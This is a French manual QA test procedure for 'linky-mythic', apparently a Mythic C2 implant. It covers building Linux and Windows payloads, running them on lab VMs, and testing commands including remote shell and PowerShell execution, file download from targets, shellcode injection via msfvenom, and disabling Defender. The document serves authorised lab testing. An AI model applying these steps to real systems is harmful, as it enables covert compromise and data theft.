# Procédure de test manuel — linky-mythic

> **Objectif** : vérifier l'intégration et le fonctionnement de `linky-mythic` au sein d'un environnement Mythic-c2, générer des payloads, puis les exécuter localement (Linux) et sur une machine virtuelle Windows.
>
> **Cadre légal** : cette procédure est réservée aux tests, recherches et exercices de sécurité **explicitement autorisés**. Ne l'utilisez que sur des systèmes, réseaux et machines que vous contrôlez ou pour lesquels vous disposez d'une autorisation écrite. Toute utilisation abusive est interdite.

---

## 0. Prérequis et hypothèses

| Élément | Valeur attendue |
|---------|-----------------|
| OS opérateur | Linux (Ubuntu/Debian recommandé) avec Docker + Docker Compose |
| Mythic | v3.4.x (testé v3.4.32) |
| C2 profile | `http` (MythicC2Profiles/http) avec `AESPSK = aes256_hmac` |
| Machine cible Linux | VM Linux x86_64 (ex. Fedora, Ubuntu) joignable par le C2 |
| Machine cible Windows | VM Windows 10/11 x64 joignable par le C2 |
| Accès réseau | la/les VM(s) doivent pouvoir joindre le C2 (port 443 TLS recommandé) |
| Compte opérateur Mythic | créé lors du `make` initial |

> **Avertissement OPSEC** : ne réalisez ces tests que dans un environnement isolé (lab dédié, VLAN séparé, snapshots VM prêts). Les payloads et les callbacks génèrent du trafic réseau détectable.

---

## 1. Installation de Mythic et du payload type

### 1.1 Installer et démarrer Mythic

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic && make
sudo ./mythic-cli start
```

Vérifier que tous les conteneurs sont `healthy` :

```bash
sudo ./mythic-cli status
docker ps --format "table {{.Names}}\t{{.Status}}"
```

Récupérer le mot de passe de l'utilisateur par défaut (`mythic_admin_user`) :

```bash
grep -E '^MYTHIC_ADMIN' Mythic/.env
```

Ouvrir l'UI : `https://localhost:7443` (accepter le certificat auto-signé).

### 1.2 Installer le profil C2 `http`

```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli start http
```

### 1.3 Installer `linky-mythic`

```bash
# Option A : depuis GitHub
sudo ./mythic-cli install github https://github.com/Nariod/linky-mythic

# Option B : depuis une copie locale (dev)
sudo ./mythic-cli install folder /chemin/absolu/linky-mythic
sudo ./mythic-cli start linky
```

> **SELinux (Fedora/RHEL)** : si le build échoue avec des erreurs de permission sur les bind-mounts :
>
> ```bash
> sudo chcon -Rt svirt_sandbox_file_t \
>   "$(pwd)/InstalledServices/linky/"
> ```

### 1.4 Vérifier l'enregistrement du payload type

Dans l'UI Mythic → **Payload Types** : `linky` doit apparaître avec son icône et la liste des 21 commandes.

En CLI :

```bash
sudo ./mythic-cli payload list
# doit afficher: linky
```

---

## 2. Configuration du profil C2 `http`

1. UI Mythic → **C2 Profiles** → `http` → **Config**.
2. Définir les paramètres recommandés :

| Paramètre | Valeur recommandée | Commentaire |
|-----------|--------------------|-------------|
| `callback_host` | `https://<IP_OU_DOMAINE_DU_SERVEUR_MYTHIC>` | HTTPS fortement recommandé ; le schéma est préservé par l'implant |
| `callback_port` | `443` | port d'écoute du profil C2 (pas le 7443 du nginx Mythic) |
| `callback_interval` | `10` | secondes entre deux checkins |
| `callback_jitter` | `23` | % de jitter |
| `AESPSK` | `aes256_hmac` | obligatoire — l'implant refuse de se construire sans |
| `post_uri` | `/data` | doit matcher `callback_uri` du payload |

> **Important** : le trafic agent va vers le **conteneur du profil C2** (port 443), **pas** vers le frontend nginx Mythic (7443). Un `callback_uri` à `/` provoque une 301.

3. Démarrer le profil : `sudo ./mythic-cli start http` ou bouton **Start** dans l'UI.

---

## 3. Génération d'un payload Linux

1. UI Mythic → **Create Payload** (ou `+ New`).
2. **Payload Type** : `linky`.
3. **C2 Profile** : `http` → cocher la config définie en §2 ; vérifier `AESPSK = aes256_hmac`.
4. **Build Parameters** :

| Paramètre | Valeur pour ce test |
|-----------|---------------------|
| `target_os` | `linux` |
| `shellcode` | `false` (tester `true` dans une étape ultérieure) |
| `debug` | `false` |
| `callback_uri` | `/data` |
| `indirect_syscalls` | ignoré (Windows only) |

5. Cliquer **Generate**.
6. **Critères de succès** :
   - Statut `success` dans l'UI.
   - `BuildMessage` du type `linky built for linux (<N> bytes)` avec N ≈ 1.9 MB.
   - Aucune entrée dans `BuildStdErr`.
   - Binaire téléchargeable (`link-linux.bin` ou similaire).
7. Télécharger le binaire via le bouton de téléchargement de l'UI.

### 3.1 (Optionnel) Génération en shellcode Linux

Refaire la même génération avec `shellcode = true`.
**Succès** : fichier `.bin` produit via `objcopy` (section `.text`), taille réduite.

---

## 4. Exécution et tests sur la cible Linux

> Préparer la VM Linux : snapshot propre, connectivité vers `https://<callback_host>:443` vérifiée avec `curl -k`.

### 4.1 Transfert et lancement

```bash
# Sur l'opérateur : copier le binaire vers la VM cible
scp link-linux.bin <user>@<vm-linux>:/tmp/link

# Sur la VM cible
chmod +x /tmp/link
/tmp/link &
```

### 4.2 Vérifier le callback dans Mythic

UI → **Active Callbacks** : une nouvelle entrée doit apparaître (host, user, IP).
Si absent : vérifier la connectivité réseau, `callback_host`/`callback_uri`, et que le profil `http` est démarré.

### 4.3 Matrice de tests de commandes (Linux)

Pour chaque ligne : cliquer sur le callback → **Task**, saisir la commande, observer la réponse dans **Task Output**. Cocher la case si conforme.

| # | Commande | Exemple de saisie | Résultat attendu | ✓ |
|---|----------|--------------------|------------------|---|
| 1 | `whoami` | `whoami` | `user@hostname` | ☐ |
| 2 | `pwd` | `pwd` | chemin absolu courant | ☐ |
| 3 | `ls` | `ls /tmp` | listing trié avec indicateurs de répertoires | ☐ |
| 4 | `cd` | `cd /var/log` | `[+] /var/log` puis vérifier via `pwd` | ☐ |
| 5 | `pid` | `pid` | PID numérique réel du process | ☐ |
| 6 | `info` | `info` | OS, arch, user, hostname, IPs, uptime | ☐ |
| 7 | `ps` | `ps` | tableau PID/PPID/USER/COMMAND | ☐ |
| 8 | `netstat` | `netstat` | tableau Proto/Local/Remote/State/PID | ☐ |
| 9 | `shell` | `shell echo hello_from_linky` | sortie `hello_from_linky` | ☐ |
| 10 | `execute` | `execute /usr/bin/uname -a` | infos kernel complètes | ☐ |
| 11 | `mkdir` | `mkdir /tmp/linky_test` | création récursive ; vérifier avec `ls` | ☐ |
| 12 | `cp` | `cp /tmp/link /tmp/link.bak` | copie ; vérifier avec `ls` | ☐ |
| 13 | `mv` | `mv /tmp/link.bak /tmp/link.renamed` | déplacement ; vérifier avec `ls` | ☐ |
| 14 | `rm` | `rm /tmp/link.renamed` | suppression ; vérifier l'absence avec `ls` | ☐ |
| 15 | `download` | `download /etc/hostname` | fichier reçu dans l'UI Mythic (transfert chunked) | ☐ |
| 16 | `upload` | (UI : sélectionner fichier + `remote_path`) | fichier présent sur la cible ; vérifier avec `ls` | ☐ |
| 17 | `sleep` | `sleep 5 23` | `[+] sleep: 5s, jitter: 23%` ; vérifier le ralentissement des checkins | ☐ |
| 18 | `killdate` | `killdate clear` | `no killdate set` | ☐ |
| 19 | `exit` | `exit` | callback passe à `Exited` / disparaît | ☐ |

**Cas de bord à valider** :
- `sleep` avec argument vide ou whitespace : ne doit **pas** crasher l'agent (régression RS-02).
- `killdate <timestamp_epoch>` dans le futur, puis vérifier qu'après la date l'agent s'arrête seul.

---

## 5. Génération d'un payload Windows

Refaire la procédure §3 avec :

| Paramètre | Valeur |
|-----------|--------|
| `target_os` | `windows` |
| `shellcode` | `false` |
| `debug` | `false` |
| `callback_uri` | `/data` |
| `indirect_syscalls` | `false` (tester `true` dans une variante) |

**Succès** : binaire `link-windows.exe` (~2 MB), aucune `BuildStdErr`.

### 5.1 Variante indirect syscalls

Refaire une génération Windows avec `indirect_syscalls = true`.
**Succès** : build OK ; les commandes `inject` utiliseront la voie NT API (via syscalls-rs).

---

## 6. Exécution et tests sur la cible Windows

> Préparer la VM Windows : snapshot propre, Defender désactivé (lab) ou exclusions sur le dossier de test, connectivité vers le C2 vérifiée.

### 6.1 Transfert et lancement

1. Copier `link-windows.exe` sur la VM (partage, RDP, ou via `upload` si un premier agent est déjà actif).
2. Exécuter (double-clic, ou depuis `cmd.exe` / PowerShell) :

```powershell
C:\Users\<user>\Desktop\link-windows.exe
```

3. Vérifier le callback dans l'UI Mythic (cf. §4.2).

### 6.2 Matrice de tests de commandes (Windows)

| # | Commande | Exemple de saisie | Résultat attendu | ✓ |
|---|----------|--------------------|------------------|---|
| 1 | `whoami` | `whoami` | `USER@HOSTNAME` | ☐ |
| 2 | `pwd` | `pwd` | `C:\Users\<user>\...` | ☐ |
| 3 | `pid` | `pid` | PID numérique réel | ☐ |
| 4 | `info` | `info` | OS, arch, user, hostname, IPs | ☐ |
| 5 | `integrity` | `integrity` | Niveau d'intégrité (Low/Medium/High/System) — ex. `High` | ☐ |
| 6 | `ls` | `ls C:\Users` | listing trié | ☐ |
| 7 | `cd` | `cd C:\Temp` | changement de répertoire ; vérifier via `pwd` | ☐ |
| 8 | `shell` | `shell echo hello` | sortie `hello` via `cmd.exe /C` | ☐ |
| 9 | `cmd` | `cmd whoami` | sortie via `cmd.exe /C` | ☐ |
| 10 | `powershell` | `powershell Get-Process -Id $PID` | sortie via `powershell.exe -noP -sta -w 1 -c` | ☐ |
| 11 | `ps` | `ps` | liste processus avec PID/nom/user | ☐ |
| 12 | `netstat` | `netstat` | tableau des connexions | ☐ |
| 13 | `mkdir` | `mkdir C:\Temp\linky_test` | création récursive ; vérifier avec `ls` | ☐ |
| 14 | `cp` | `cp C:\Temp\a.txt C:\Temp\b.txt` | copie ; vérifier avec `ls` | ☐ |
| 15 | `mv` | `mv C:\Temp\b.txt C:\Temp\c.txt` | déplacement ; vérifier avec `ls` | ☐ |
| 16 | `rm` | `rm C:\Temp\c.txt` | suppression ; vérifier l'absence | ☐ |
| 17 | `execute` | `execute C:\Windows\System32\hostname.exe` | sortie `hostname` | ☐ |
| 18 | `download` | `download C:\Windows\System32\drivers\etc\hosts` | fichier reçu dans l'UI | ☐ |
| 19 | `upload` | (UI : fichier + `remote_path`) | fichier présent sur la cible ; vérifier | ☐ |
| 20 | `inject` | `inject <pid> <base64_shellcode>` | injection dans un process cible (voir §6.3) | ☐ |
| 21 | `sleep` | `sleep 5 23` | `[+] sleep: 5s, jitter: 23%` | ☐ |
| 22 | `killdate` | `killdate clear` | `no killdate set` | ☐ |
| 23 | `exit` | `exit` | callback `Exited` / disparaît | ☐ |

### 6.3 Détail — test de `inject`

L'injection prend le PID d'un processus cible et du shellcode base64.

Syntaxes acceptées :
- `inject <pid> <base64_shellcode>` (texte)
- JSON : `{"pid": <pid>, "shellcode": "<base64_shellcode>"}`

Procédure :

1. Lancer un processus cible inoffensif, ex. `notepad.exe`.
2. Récupérer son PID via `ps` ou `cmd tasklist`.
3. Générer un shellcode de test (ex. `msfvenom -p windows/x64/exec CMD=calc.exe -f base64`).
4. Tâche : `inject <notepad_pid> <base64_shellcode>`.
5. **Succès** : la calc s'ouvre (ou le comportement attendu du shellcode) ; le process `notepad.exe` reste vivant.
6. Variante : refaire avec le payload `indirect_syscalls = true` (§5.1) et comparer le comportement.

> **Sécurité** : n'injectez que des shellcodes de test inoffensifs et uniquement sur vos VM de lab.

---

## 7. Tests de non-régression et cas aux limites

| Test | Procédure | Succès attendu |
|------|-----------|----------------|
| Build sans C2 profile | Générer un payload sans profil `http` | Échec propre : message `linky requires the HTTP C2 profile with AESPSK set to aes256_hmac` |
| Build avec `AESPSK` vide | Profil http sans `aes256_hmac` | Échec propre (même message) |
| `target_os` invalide | Forcer une valeur non supportée | `unknown target_os: <valeur>` |
| Redémarrage du conteneur linky | `sudo ./mythic-cli restart linky` | Le conteneur se réenregistre ; commandes toujours présentes |
| Perte réseau pendant un checkin | Couper le réseau de la VM, restaurer | L'agent reprend les checkins après restauration ; tâches en attente s'exécutent |
| `upload` en JSON | Saisir `{"remote_path":"C:\\Temp\\x"}` via la modale | Fichier déposé au bon chemin (régression GO-08) |
| `inject` en JSON | `{"pid":1234,"shellcode":"..."}` | Accepté (régression GO-09) |
| `sleep` whitespace | `sleep   ` (espaces seulement) | Aucun crash de l'agent (régression RS-02) |

---

## 8. Tests automatisés (sanity build)

Avant / après les tests manuels, lancer la suite automatisée du dépôt :

```bash
cd /chemin/vers/linky-mythic
./run_tests.sh
```

Doit afficher `All tests passed.` (cargo fmt check + cargo test --workspace + go build + go vet).

---

## 9. Nettoyage et remise en état

```bash
# Sur chaque VM cible : supprimer les binaires et artefacts
rm -f /tmp/link*                    # Linux
del C:\Users\<user>\Desktop\link-windows.exe   # Windows

# Arrêter Mythic (lab)
cd Mythic
sudo ./mythic-cli stop
# Optionnel : restaurer les snapshots VM
```

---

## 10. Récapitulatif de validation

| Phase | Critère | État |
|-------|---------|------|
| Installation | `linky` enregistré et 21 commandes visibles | ☐ |
| Profil C2 | `http` configuré, démarré, `AESPSK=aes256_hmac` | ☐ |
| Build Linux | Succès, ~1.9 MB, pas d'erreur | ☐ |
| Exécution Linux | Callback actif, commandes §4.3 validées | ☐ |
| Build Windows | Succès, ~2 MB, pas d'erreur | ☐ |
| Build Windows indirect-syscalls | Succès | ☐ |
| Exécution Windows | Callback actif, commandes §6.2 validées | ☐ |
| Injection | `inject` fonctionnel (standard + indirect syscalls) | ☐ |
| Non-régression | Cas §7 validés | ☐ |
| Tests automatisés | `run_tests.sh` OK | ☐ |

---

## 11. Troubleshooting rapide

| Symptôme | Cause probable | Action |
|----------|-----------------|--------|
| Aucun callback après lancement | `callback_host`/`callback_uri` erronés, profil C2 arrêté, pare-feu | Vérifier profil http démarré, connectivité `curl -k https://<host>:443/data`, `callback_uri=/data` |
| Build échoue « cargo build failed » | SELinux / permissions bind-mount | `chcon -Rt svirt_sandbox_file_t InstalledServices/linky/` |
| `upload` erreur « Required arg, file, was not specified » | Saisie texte au lieu de la modale UI | Utiliser la modale de sélection de fichier (régression GO-08) |
| `inject` erreur « Required arg, pid, was not specified » | Format invalide | `inject <pid> <b64>` ou JSON `{"pid":..,"shellcode":".."}` (régression GO-09) |
| `301` sur les checkins | `callback_uri=/` | Mettre `callback_uri=/data` |
| macOS build échoue | osxcross non installé | Attendu (non supporté actuellement) |
